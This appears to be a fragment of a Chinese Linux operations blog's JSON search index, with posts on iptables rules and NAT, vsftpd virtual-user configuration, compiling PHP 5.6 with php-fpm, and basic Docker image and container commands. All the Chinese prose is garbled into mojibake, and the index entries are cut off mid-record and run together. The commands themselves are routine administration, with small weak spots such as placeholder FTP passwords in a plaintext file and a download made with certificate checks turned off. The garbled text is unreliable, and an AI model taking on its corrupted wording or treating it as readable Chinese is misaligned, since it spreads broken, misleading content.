åœ¨åŒä¸€æ—¶é—´å†…å…è®¸é€šè¿‡çš„è¯·æ±‚nä¸ª 4. ç¤ºä¾‹ æ¸…ç©ºè§„åˆ™ã€ç”¨æˆ·è‡ªå®šä¹‰é“¾ã€é“¾çš„è®¡æ•°å™¨ [root@00 ~]# iptables -F [root@00 ~]# iptables -X [root@00 ~]# iptables -Z æ‹’ç»è§„åˆ™ [root@00 ~]# iptables -t filter -A INPUT -p tcp --dport 22 -j DROP [root@00 ~]# iptables -t filter -A INPUT -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT -i eth0 -s 172.16.80.0/24 -j DROP [root@00 ~]# iptables -t filter -A INPUT ! -s 172.16.80.0/24 -j DROP # æ‹’ç»é 172.16.80.0/24 ç½‘æ®µè¿›è¡Œè¿æ¥(6.xå!æ”¾åœ¨-så‰é¢) åŒ¹é…ICMPç±»å‹ [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -j DROP # 8 ä»£è¡¨ping [root@00 ~]# iptables -A INPUT -p icmp --icmp-type 8 -s 172.18.80.0/24 -j DROP [root@00 ~]# å…è®¸å…³è”çš„çŠ¶æ€åŒ…(å¦‚vsftpdæœåŠ¡) [root@00 ~]# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT [root@00 ~]# iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT nat å…±äº«ç½‘ç»œ # å­˜åœ¨å›ºå®šçš„å¤–ç½‘åœ°å€ [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -o eth1 -j SNAT --to-source 172.16.110.131 # -s 10.0.1.0/24 ä¸ºåŠå…¬å®¤æˆ–IDCå†…ç½‘ç½‘æ®µ;-o eth1 ä¸ºç½‘å…³çš„å¤–ç½‘ç½‘å¡æ¥å£;-j SNAT --to-source 172.16.110.131 æ˜¯å¤–ç½‘ç½‘å¡çš„ipåœ°å€ # å­˜åœ¨å˜åŒ–çš„å¤–ç½‘åœ°å€(ä¼ªè£…) [root@00 ~]# iptables -t nat -A POSTROUTING -s 10.0.1.0/24 -j MASQUERADE nat ç«¯å£è½¬å‘(ä¸€å¯¹ä¸€æ˜ å°„) # è®¿é—® 172.16.80.31:2121è½¬å‘åˆ° 172.16.110.131:22 [root@00 ~]# iptables -t nat -A PREROUTING -p tcp -i eth0 -d 172.16.80.31 --dport 2121 -j DNAT --to 172.16.110.131:22 [root@00 ~]# iptables -t nat -I POSTROUTING -d 172.16.110.131 -j SNAT --to-source 172.16.80.31 ","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/:0:0","tags":["linux","iptables"],"title":"Iptableså¸¸ç”¨","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Vsftpdå®‰è£…é…ç½®","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","ftp","è§£å†³æ–¹æ¡ˆ"],"title":"Vsftpdå®‰è£…é…ç½®","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" æ³¨æ„ æ–‡ç« äºæœ€åæäº¤æ—¥ä¿®æ”¹è¿‡ä¸€æ¬¡ï¼Œä½†æ²¡æœ‰æµ‹è¯•ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰æ”¹é”™ åŒ…å«è™šæ‹Ÿç”¨æˆ·å’Œæœ¬åœ°ç”¨æˆ·é…ç½®ï¼Œå¦è¿˜æœ‰ä¸€ä¸ªpure-ftp,æ®è¯´é…ç½®ä¾¿æ·ä¸è¿‡æ²¡æœ‰ç”¨è¿‡ æ­¤ç¯‡å†…å®¹å°±æ˜¯å®Œå…¨çš„ä¸€ä¸ªä¸ªäººè®°å½•äº†ï¼Œå…¶ä»–äººä¼°è®¡æ˜¯çœ‹ä¸æ‡‚çš„ã€‚ åŸºç¡€ç¯å¢ƒ: Fedora 25 vsftd 3.0.3 1. å®‰è£… vsftpd 1.1. è™šæ‹Ÿç”¨æˆ· [root@00 ~]# dnf install -y vsftpd ä¾èµ–å…³ç³»è§£å†³ã€‚ -----çœç•¥éƒ¨åˆ†å†…å®¹----- è¿è¡Œäº‹åŠ¡ å®‰è£…: vsftpd-3.0.3-2.fc25.x86_64 1/1 éªŒè¯: vsftpd-3.0.3-2.fc25.x86_64 1/1 å·²å®‰è£…: vsftpd.x86_64 3.0.3-2.fc25 å®Œæ¯•ï¼ [root@00 vsftpd]# cp -v /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.default [root@00 vsftpd]# grep -v \"#\" /etc/vsftpd/vsftpd.conf.default \u003e/etc/vsftpd/vsftpd.conf # æ¸…ç©ºæ–‡ä»¶æ³¨é‡Š æ­¤æ­¥éª¤å¯ä»¥ä¸åš 1.1.1. åˆ›å»ºè™šæ‹Ÿç”¨æˆ·é…ç½®æ–‡ä»¶ [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim .vsftpd_login.list #å•æ•°è¡Œç”¨æˆ·å å¶æ•°è¡Œå¯†ç  vsftpd01 pw01 vsftpd02 pw02 [root@00 vsftpd]# db_load -T -t hash -f .vsftpd_login.list vsftpd_login.db # åŠ å¯†é…ç½®æ–‡ä»¶ (åŸé…ç½®æ–‡ä»¶.vsftpd_login.listå¯ä»¥åˆ é™¤ï¼Œä½†å¦‚æœè¯¥é…ç½®çš„ç”¨æˆ·åå¯†ç æ¯”è¾ƒé‡è¦ä¸”ä¸å¯æ›´æ”¹ï¼Œå»ºè®®ä¿ç•™å¤‡ä»½è‡³å…¶ä»–åœ°æ–¹æˆ–å¢åŠ 000æƒé™ï¼Œä»¥å¤‡åç»­å¢åˆ æ”¹ç”¨æˆ·æ—¶æ— æ³•çŸ¥é“åŸé…å·²é…ç½®ç”¨æˆ·åå¯†ç ï¼›/usr/bin/db_dump -d a /etc/vsftpd/vsftpd_login.db å¯ä»¥åå‘æŸ¥è¯¢å¯†ç ,æ³¨æ„æ‰§è¡Œå‰æœ€å¥½å…ˆå°†dbæ–‡ä»¶å¤‡ä¸ªä»½,ä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆ,å½“ä½ æŠŠå‚æ•°å†™é”™äº†çš„æ—¶å€™ä½ å°±çŸ¥é“äº†) [root@00 vsftpd]# file vsftpd_login.db vsftpd_login.db: Berkeley DB (Hash, version 9, native byte-order) [root@00 vsftpd]# chmod 600 vsftpd_login.db 1.1.2. åˆ›å»ºç”¨äºFTPæœåŠ¡å­˜å‚¨æ–‡ä»¶çš„æ ¹ç›®å½•ä»¥åŠè™šæ‹Ÿç”¨æˆ·æ˜ å°„çš„ç³»ç»Ÿæœ¬åœ°ç”¨æˆ· [root@00 vsftpd]# useradd -u 1010 -d /var/ftproot -s /sbin/nologin www # æŒ‡å®šuidæ˜¯ä¸ºäº†syncä½¿ç”¨ [root@00 vsftpd]# chmod -Rf 755 /var/ftproot/ [root@00 vsftpd]# ls -ld /var/ftproot/ drwxr-xr-x. 3 www www 4096 4æœˆ 29 11:50 /var/ftproot/ 1.1.3. å»ºç«‹ç”¨äºæ”¯æŒè™šæ‹Ÿç”¨æˆ·çš„PAMè®¤è¯æ–‡ä»¶ [root@00 vsftpd]# cd /etc/vsftpd [root@00 vsftpd]# vim /etc/pam.d/vsftpd auth required pam_userdb.so db=/etc/vsftpd/vsftpd_login account required pam_userdb.so db=/etc/vsftpd/vsftpd_login [root@00 vsftpd]# vi vsftpd.conf anonymous_enable=NO local_enable=YES write_enable=NO anon_upload_enable=NO anon_mkdir_write_enable=NO anon_other_write_enable=NO anon_world_readable_only=NO reverse_lookup_enable=NO chroot_local_user=YES allow_writeable_chroot=YES guest_enable=YES guest_username=www pam_service_name=/etc/pam.d/vsftpd user_config_dir=/etc/vsftpd/user_conf xferlog_enable=YES xferlog_file=/var/log/vsftpd.log listen=YES listen_port=21 pasv_min_port=30000 pasv_max_port=30020 use_localtime=YES data_connection_timeout=180 [root@00 vsftpd]# mkdir /etc/vsftpd/user_conf [root@00 vsftpd]# vim ./user_conf/vsftpd01 local_root=/var/ftproot write_enable=YES anon_world_readable_only=NO anon_upload_enable=YES anon_mkdir_write_enable=YES anon_other_write_enable=YES [root@00 vsftpd]# touch ./user_conf/vsftpd02 1.1.4. ä¿®æ”¹selinuxå®‰å…¨ä¸Šä¸‹æ–‡(å¦‚æœå…³é—­selinux å¿½ç•¥æ­¤æ­¥) [root@00 vsftpd]# getsebool -a|grep ftp ftpd_anon_write --\u003e off ftpd_connect_all_unreserved --\u003e off ftpd_connect_db --\u003e off ftpd_full_access --\u003e off ftpd_use_cifs --\u003e off ftpd_use_fusefs --\u003e off ftpd_use_nfs --\u003e off ftpd_use_passive_mode --\u003e off httpd_can_connect_ftp --\u003e off httpd_enable_ftp_server --\u003e off tftp_anon_write --\u003e off tftp_home_dir --\u003e off [root@00 vsftpd]# setsebool -P ftpd_full_access=on 1.1.5. å–æ¶ˆé˜²ç«å¢™å¯¹äºftpçš„é™åˆ¶(firewalld ï¼Œiptables è¯·è‡ªè¡Œå‚è€ƒç›¸å…³é…ç½®) [root@00 ~]# firewall-cmd --add-service=ftp success [root@00 ~]# firewall-cmd --add-service=ftp --permanent success 1.1.6. é‡å¯vsftpd [root@00 vsftpd]# systemctl restart vsftpd #redhat7.xä»¥ä¸‹æ˜¯service vsftpd restart [root@00 ~]# systemctl enable vsftpd # å°†vsftpdåŠ å…¥å¼€æœºå¯åŠ¨ redhat7.xä»¥ä¸‹åº”è¯¥æ˜¯chkconfig vsftpd add Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service â†’ /usr/lib/systemd/system/vsftpd.service. 2. æœ¬åœ°ç”¨æˆ· æœ¬åœ°ç”¨æˆ·å’Œè™šæ‹Ÿç”¨æˆ·çš„åŒºåˆ«åªæ˜¯åœ¨äºé…ç½®æ–‡ä»¶å’Œå»ºè®¾ç”¨æˆ·çš„åŒºåˆ« 2.1. å®‰è£…vsftpd ï¼š [root@cloud ~]# yum install vsftpd å·²åŠ è½½æ’ä»¶ï¼šfastestmirror, langpacks Repository base is listed more than once in the configuration Repository updates is listed more than once in the configuration Repository extras is listed more than once in the configuration Repository centosplus is listed more than once in the configuration Loading mirror speeds from cached hostfile * base: mirrors.cqu.edu.cn * extras: mirror.lzu.edu.cn * updates: mirrors.sohu.com æ­£åœ¨è§£å†³ä¾èµ–å…³ç³» ..........çœéƒ¨åˆ†å†…å®¹............ æ­£åœ¨å®‰è£… : vsftpd-3.0.2-21.el7.x86_64 1/1 éªŒè¯ä¸­ : vsftpd-3.0.2-21.el7.x86_64 1/1 å·²å®‰è£…: vsftpd.x86_64 0:3.0.2-21.el7 å®Œæ¯•ï¼ [root@cloud ~]# mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftp","date":"2019-03-05","objectID":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","ftp","è§£å†³æ–¹æ¡ˆ"],"title":"Vsftpdå®‰è£…é…ç½®","uri":"/posts/linux/vsftpd%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Phpå®‰è£…ç»´æŠ¤","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","php"],"title":"Phpå®‰è£…ç»´æŠ¤","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" å‰è¨€ è®°å½•ä¸€ä¸ªphpçš„å®‰è£…è¿‡ç¨‹ï¼Œä»…ä½œä¸ºä¸ªäººä½¿ç”¨è®°å½•ï¼Œå¯å‚è€ƒ åŸºç¡€ç¯å¢ƒ: CentOS 7.6 php 5.6.38 2. å®‰è£… [root@00 ~]# mkdir /opt/software [root@00 ~]# cd /opt/software [root@00 software]# useradd -d /var/ftproot -s /sbin/nologin www [root@00 software]# yum install -y zlib-devel libxml2-devel libjpeg-devel libjpeg-turbo-devel freetype-devel libpng-devel gd-devel libcurl-devel libxslt-devel openssl openssl-devel mhash libmcrypt-devel mcrypt gcc glibc gcc-c++ [root@00 software]# wget https://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz --no-check-certificate [root@00 software]# tar xzf libiconv-1.15.tar.gz [root@00 software]# cd libiconv-1.15 [root@00 libiconv-1.15]# ./configure --prefix=/usr/local/libiconv [root@00 libiconv-1.15]# make \u0026\u0026 make install ## ---- è¿‡ç¨‹çœç•¥ ---- ## ## ---- è¿‡ç¨‹é”™è¯¯è‡ªè¡Œæ’æŸ¥ ---- ## [root@00 libiconv-1.15]# cd /opt/software [root@00 software]# wget http://mirrors.sohu.com/php/php-5.6.38.tar.gz [root@00 software]# tar -xzf php-5.6.38.tar.gz [root@00 php-5.6.38]# cd php-5.6.38 ## æ ‡å‡†çš„ç”Ÿäº§ç¯å¢ƒç¼–è¯‘å‚æ•°(nginx) ## ------------------------ ## ## apacheå–æ¶ˆä»¥ä¸‹å‚æ•°(apache+phpæ—¶æ˜¯ä¸éœ€è¦å°†phpå¯åŠ¨çš„ï¼Œphpæ˜¯å°†æ¨¡å—ç›´æ¥ç¼–è¯‘è¿›å…¥apacheçš„) ## --enable-opcache=no ## --enable-fpm ## --with-fpm-user=www ## --with-fpm-group=www ## æ·»åŠ ä»¥ä¸‹å‚æ•°ï¼ŒæŒ‡å‘apacheçš„apxs ## --with-apxs2=/opt/apache/bin/apxs ## ------------------------ ## [root@00 php-5.6.38]# ./configure \\ --prefix=/opt/php5.6.38 \\ --with-config-file-path=/opt/php5.6.38/etc \\ --with-mysql=mysqlnd \\ --with-mysqli=mysqlnd \\ --with-pdo-mysql=mysqlnd \\ --with-iconv-dir=/usr/local/libiconv \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir \\ --enable-xml \\ --disable-rpath \\ --disable-debug \\ --enable-bcmath \\ --enable-shmop \\ --enable-sysvsem \\ --enable-inline-optimization \\ --with-curl \\ --enable-mbregex \\ --enable-fpm \\ --enable-mbstring \\ --with-mcrypt \\ --with-gd \\ --enable-gd-native-ttf \\ --with-openssl \\ --with-mhash \\ --enable-pcntl \\ --enable-sockets \\ --with-xmlrpc \\ --enable-zip \\ --enable-soap \\ --enable-short-tags \\ --enable-static \\ --with-xsl \\ --with-fpm-user=www \\ --with-fpm-group=www \\ --enable-ftp \\ --enable-opcache=no # # --enable-opcache æ­¤æ‰©å±•å¯èƒ½ä¸ç¨³å®šï¼Œå› æ­¤å…³é—­ï¼Œ # ä¹Ÿå¯ä»¥ä½¿ç”¨--disable-opcache è¿›è¡Œå…³é—­ï¼Œé»˜è®¤æ˜¯å¯ç”¨çš„ # (ç°å½“å‰ç‰ˆæœ¬ä¸çŸ¥é“æ˜¯å¦ç¨³å®šäº›äº†) # # 5.3 æ·»åŠ çš„é¢å¤–å‚æ•° # --with-curlwrappers # --enable-safe-mode # --enable-zend-multibyte [root@00 php-5.6.38]# make \u0026\u0026 make install ## ---- è¿‡ç¨‹çœç•¥ ---- ## ## ---- è¿‡ç¨‹é”™è¯¯è‡ªè¡Œæ’æŸ¥ ---- ## [root@00 php-5.6.38]# cp -v ./php.ini-production /opt/php5.6.38/etc/php.ini [root@00 php-5.6.38]# cp -v /opt/php5.6.38/etc/php-fpm.conf.default /opt/php5.6.38/etc/php-fpm.conf [root@00 php-5.6.38]# ln -s /opt/php5.6.38/ /opt/php # ä¼˜åŒ–è·¯å¾„ï¼Œç”¨äºåç»­å¯èƒ½çš„å‡çº§ ## --- å®‰è£…å®Œæˆ --- ## è‹¥éœ€è¦å°†php-fpm åŠ å…¥åˆ°ç³»ç»ŸæœåŠ¡å½“ä¸­ï¼Œ åœ¨/opt/software/php-5.6.38/sapi/fpmç›®å½•ä¸‹,å°†php-fpm.serviceæ–‡ä»¶ä¸­å¯¹åº”çš„${prefix}å’Œ${exec_prefix}æ”¹ä¸ºç¨‹åºç¼–è¯‘åçš„å¯¹åº”ç›®å½•ï¼Œè®©åå°†æ–‡ä»¶cpåˆ°/usr/lib/systemd/system/ä¸‹, ç„¶åæ‰§è¡Œsystemctl daemon-reloadé‡åŠ è½½å³å¯ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨systemctl {start|stop|restart} php-fpm.services å¯¹php-fpmè¿›è¡Œç®¡ç†äº†(CentOS 6.x çš„ä¸çŸ¥é“) 2.1 php æ‰©å±•ç¼–è¯‘ æ‰©å±•å®‰è£…çš„æ“ä½œæ­¥éª¤(ä»¥xcacheä¸ºä¾‹): ä¸‹è½½éœ€è¦å®‰è£…çš„æ‰©å±•æºç ï¼Œè§£å‹è¿›å»åï¼Œå…ˆæ‰§è¡Œ /opt/php5.6.38/bin/phpize ç”Ÿæˆconfigureé…ç½®æ–‡ä»¶ é…ç½®å½“å‰æ‰©å±•ç¼–è¯‘./configure --enable-xcache --with-php-config=/opt/php5.6.38/bin/php-config ç¼–è¯‘å¹¶å®‰è£… make \u0026\u0026 make install,ç¼–è¯‘å¹¶å®‰è£…æˆåŠŸåä¼šåœ¨/opt/php5.6.38/lib/php/extensionsç›®å½•ä¸‹ç”Ÿæˆå¯¹åº”ç›®å½•ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªxcache.soçš„æ–‡ä»¶. 3. ç›¸å…³å‚æ•°è¯´æ˜ 3.1. php-fpm.conf pid = run/php-fpm.pid error_log = log/php-fpm.log user = www group = www # è®¾ç½®æ¥å— FastCGI è¯·æ±‚çš„åœ°å€ å¯ä¸ºsocketè·¯å¾„,(socketé»˜è®¤ä½ç½®phpæ ¹ç›®å½•) listen = 127.0.0.1:9000 #å…è®¸è¿æ¥åˆ° FastCGI çš„æœåŠ¡å™¨ IPV4 åœ°å€ listen.allowed_clients = 127.0.0.1 # è®¾ç½®è¿›ç¨‹ç®¡ç†å™¨å¦‚ä½•ç®¡ç†å­è¿›ç¨‹ï¼ŒdynamicåŠ¨æ€è®¾ç½®,å¿…é¡»é…åˆ # pm.max_childrenï¼Œpm.start_serversï¼Œpm.min_spare_serversï¼Œpm.max_spare_serverså‚æ•°è¿›è¡Œè®¾ç½® pm = dynamic # è®¾ç½®æœ€å¤§å¯åˆ›å»ºçš„å­è¿›ç¨‹çš„æ•°é‡(ä»…ä»£è¡¨åŠ¨æ€è®¾ç½®) pm.max_children = 300 # è®¾ç½®å¯åŠ¨æ—¶åˆ›å»ºçš„å­è¿›ç¨‹æ•°ç›® pm.start_servers = 30 # pm.*_spare_servers è®¾ç½®ç©ºé—²æœåŠ¡è¿›ç¨‹çš„æœ€ä½/æœ€å¤§æ•°ç›® pm.min_spare_servers = 30 pm.max_spare_servers = 300 # è®¾ç½®æ¯ä¸ªå­è¿›ç¨‹é‡ç”Ÿä¹‹å‰æœåŠ¡çš„è¯·æ±‚æ•° pm.max_requests = 65535 # è®¾ç½®æ–‡ä»¶æ‰“å¼€æè¿°ç¬¦çš„ rlimit é™åˆ¶ï¼Œé»˜è®¤ç³»ç»Ÿå®šä¹‰å€¼ rlimit_files = 65535 è¯¦ç»†å‚æ•°è¯´æ˜: https://secure.php.net/manual/zh/install.fpm.configuration.php 4. windows_php iis å¯ç›´æ¥å®‰è£…ä¸ºweb-platfromï¼Œç„¶åæœç´¢php manager https://www.iis.net/downloads/microsoft/web-platform-installer è‹¥æ— æ³•æ­£å¸¸ä½¿ç”¨","date":"2019-03-04","objectID":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:0:0","tags":["linux","php"],"title":"Phpå®‰è£…ç»´æŠ¤","uri":"/posts/linux/php%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Docker éƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","docker"],"title":"Docker éƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"â€ƒDocker æ˜¯é€šè¿‡å†…æ ¸è™šæ‹ŸåŒ–æŠ€æœ¯(namespacesåŠcgroupsç­‰)æ¥æä¾›å®¹å™¨çš„èµ„æºéš”ç¦»ä¸å®‰å…¨ä¿éšœç­‰.ç”±äºdockeré€šè¿‡æ“ä½œç³»ç»Ÿå±‚çš„è™šæ‹ŸåŒ–å®ç°éš”ç¦»,æ‰€ä»¥Docikerå®¹å™¨åœ¨è¿è¡Œæ—¶,ä¸éœ€è¦è™šæ‹Ÿæœº(VM)é¢å¤–çš„æ“ä½œç³»ç»Ÿå¼€é”€,æé«˜èµ„æºåˆ©ç”¨ç‡. å®‰è£…ç¯å¢ƒ: CentOS 7 docker: 17.09.0-ce virtualbox: 5.1.30 1. å‰è¨€ docker èƒ½å¹²ä»€ä¹ˆ? ç®€åŒ–é…ç½® ä»£ç æµæ°´çº¿ç®¡ç† ç¯å¢ƒä¸€è‡´æ€§,æé«˜å¼€å‘æ•ˆç‡ å¿«é€Ÿéƒ¨ç½² â€¦ 2. å®‰è£…å¹¶å¯åŠ¨docker [root@00 ~]# yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo #å¯¼å…¥dockeræºä»¥ä¾¿äºå®‰è£…æœ€æ–°ç‰ˆdocker [root@00 ~]# yum install docker-ce -y #########å¿½ç•¥å®‰è£…è¿‡ç¨‹############# [root@00 ~]# systemctl start docker #å¯åŠ¨docker â— docker.service - Docker Application Container Engine Loaded: loaded (/usr/lib/systemd/system/docker.service; disabled; vendor preset: disabled) Active: active (running) since ä¸‰ 2017-10-25 01:30:27 EDT; 4min 2s ago Docs: https://docs.docker.com Main PID: 2788 (dockerd) Memory: 21.3M CGroup: /system.slice/docker.service â”œâ”€2788 /usr/bin/dockerd â””â”€2793 docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --metrics-interval=0 --start-time... #############çœç•¥éƒ¨åˆ†æ•°æ®################### [root@00 ~]# ifconfig docker0 # docker å®‰è£…æˆåŠŸåé»˜è®¤åˆ›å»ºä¸€ä¸ªdocker0é»˜è®¤çš„ç½‘æ¡¥ docker0: flags=4099\u003cUP,BROADCAST,MULTICAST\u003e mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 0.0.0.0 ether 02:42:72:b8:2a:55 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0ï»¿â€‹ 3. dockerçš„ä½¿ç”¨ 3.1. é•œåƒçš„å¢ã€åˆ ã€æŸ¥ # \u003e\u003e\u003e é•œåƒæŸ¥è¯¢ [root@00 ~]# docker search centos #é•œåƒæœç´¢ INDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATED docker.io docker.io/centos The official build of CentOS. 3732 [OK] docker.io docker.io/ansible/centos7-ansible Ansible on Centos7 102 [OK] docker.io docker.io/jdeathe/centos-ssh CentOS-6 6.9 x86_64 / CentOS-7 7.4.1708 x8... 87 [OK] #------------------çœç•¥éƒ¨åˆ†æ•°æ®--------------------- # \u003e\u003e\u003e é•œåƒä¸‹è½½ [root@00 default]# docker pull docker.io/centos #é•œåƒè¿œç¨‹ä¸‹è½½ #å…³äºdockerçš„åŠ é€Ÿå™¨çš„é…ç½®ï¼Œè¿™ä¸ªé˜¿é‡Œäº‘ä¹Ÿæœ‰ç›¸å…³é…ç½®æ–¹æ³•ï¼Œå…·ä½“ä¸å¤šè¯´ï¼Œä¸‹é¢æ˜¯å…·ä½“çš„é…ç½®æ–‡ä»¶å’Œæ ¼å¼ # /etc/docker/daemon.json #{ # \"registry-mirrors\": [\"ä½ çš„åŠ é€Ÿåœ°å€\"] #} # Using default tag: latest Trying to pull repository docker.io/library/centos ... latest: Pulling from docker.io/library/centos d9aaf4d82f24: Pull complete Digest: sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e # \u003e\u003e\u003e é•œåƒæŸ¥çœ‹ [root@00 ~]# docker images #æŸ¥çœ‹å·²å®‰è£…é•œåƒ REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB # \u003e\u003e\u003e é•œåƒå¯¼å‡º [root@00 ~]# docker save -o centos.tar docker.io/centos # å¯¼å‡ºé•œåƒåˆ°æœ¬åœ° [root@00 default]# docker rmi 196e0ce0c9fb # é•œåƒåˆ é™¤ï¼Œä½¿ç”¨é•œåƒidè¿›è¡Œåˆ é™¤ Untagged: docker.io/centos:latest Untagged: docker.io/centos@sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e Deleted: sha256:196e0ce0c9fbb31da595b893dd39bc9fd4aa78a474bbdc21459a3ebe855b7768 Deleted: sha256:cf516324493c00941ac20020801553e87ed24c564fb3f269409ad138945948d4 # \u003e\u003e\u003e é•œåƒå¯¼å…¥ [root@00 ~]# docker load --input centos.tar # å¯¼å…¥æœ¬çš„é•œåƒæˆ–è€…docker load \u003c centos.tarï¼Œå…³äºdockerå‘½ä»¤ï¼Œå¦‚æœä½ æ˜¯æ™®é€šç”¨æˆ·ï¼Œåªéœ€è¦æŠŠä½ çš„ç”¨æˆ·åŠ å…¥åˆ°dockerç»„å½“ä¸­å°±ä¸éœ€è¦sudoæ‰å¯ä»¥æ‰§è¡Œå‘½ä»¤äº† sudo usermod -aG docker zabbix cf516324493c: Loading layer [==================================================\u003e] 205.2 MB/205.2 MB Loaded image: docker.io/centos:latest [root@00 ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB 3.2. å®¹å™¨çš„æ·»åŠ ã€åˆ é™¤ã€ç™»é™† [root@00 ~]# docker run centos /bin/echo 'hello word' # centos ä¸ºé•œåƒåç§°ï¼Œå‘½ä»¤æ ¼å¼:docker run [å‚æ•°] [é•œåƒåç§°] [è¿è¡Œå‘½ä»¤] (æ³¨ï¼šè¿›ç¨‹ç»“æŸå³ä»£è¡¨å®¹å™¨ç»“æŸ) hello word ############ æ–°å»ºä¸€ä¸ªmydockerçš„å®¹å™¨ï¼Œä»–çš„é•œåƒæ˜¯centos ######## ############ --nameï¼šæŒ‡å®šå®¹å™¨åç§° -tï¼šè®©dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œ-iï¼šè¡¨ç¤ºæ‰“å¼€æ ‡å‡†è¾“å…¥ ######## [root@00 ~]# docker run --name mydocker -t -i centos /bin/bash [root@8679d53c43c4 /]# ls #\u003c=======æ³¨æ„çœ‹ä¸»æœºåå·²ç»æ”¹å˜ anaconda-post.log bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@8679d53c43c4 /]# uname -a Linux 8679d53c43c4 3.10.0-327.el7.x86_64 #1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux [root@8679d53c43c4 /]# exit # é€€å‡ºå®¹å™¨ï¼Œåˆ™è¿›ç¨‹å…³é—­ï¼Œä»£è¡¨æ­¤å®¹å™¨å·²å®Œå…¨å…³é—­ exit [root@00 ~]# docker ps -a # æŸ¥çœ‹å·²æœ‰å®¹å™¨ CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8679d53c43c4 centos \"/bin/b","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","docker"],"title":"Docker éƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Awstatsæ—¥å¿—åˆ†æç³»ç»Ÿ","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","æ—¥å¿—","awstats"],"title":"Awstatsæ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" å®‰è£…ç¯å¢ƒ centos 6.7 nginx 1.12 awstats 7.5 [ ä¸€ä¸ªå°å‘ ] è¿™ä¸ªæ˜¯æˆ‘æ—©æœŸçš„ä¸€ä¸ªæ“ä½œè¿‡ç¨‹ï¼Œå½“æ—¶æ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œç„¶åè·Ÿç€åˆ«äººçš„ä¸€ç¯‡æ–‡ç« 